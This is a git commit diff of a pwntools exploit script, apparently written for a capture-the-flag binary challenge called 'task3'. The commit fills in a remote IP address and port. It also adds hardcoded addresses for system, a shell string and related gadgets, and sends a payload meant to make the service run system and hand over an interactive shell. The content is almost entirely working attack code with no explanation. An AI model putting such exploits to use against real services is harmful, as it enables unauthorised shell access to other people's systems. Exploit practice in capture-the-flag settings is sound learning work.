7cfe5b716566d4d2d58c53d4eedd647bc15a3328
Тарасов Алексей <tarasovion2004@gmail.com>
2022-01-30 19:48:57 +0300

    :)

--- pwn/sploit.py
+++ pwn/sploit.py
@@ -5,10 +5,10 @@ from pwn import *
 
 # SETTINGS
 
-BINARY = ""
+BINARY = "task3"
 
-IP = "IP_ADDR"
-PORT = None
+IP = "92.53.104.174"
+PORT = 37005
 
 LINK_LIBC = False
 LIBC = ""
@@ -21,5 +21,14 @@ LOG_LEVEL = "DEBUG"
 r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)
 
 # SPLOIT #
+
+vuln =      p64(0x401245)
+list_tmp =  p64(0x401280)
+ls =        p64(0x40201f)
+sh =        p64(0x404050)
+_system =   p64(0x401090)
+system =    p64(0x4040A0)
+
+r.send(ls * 3 + list_tmp + system + sh)
 
 r.interactive()
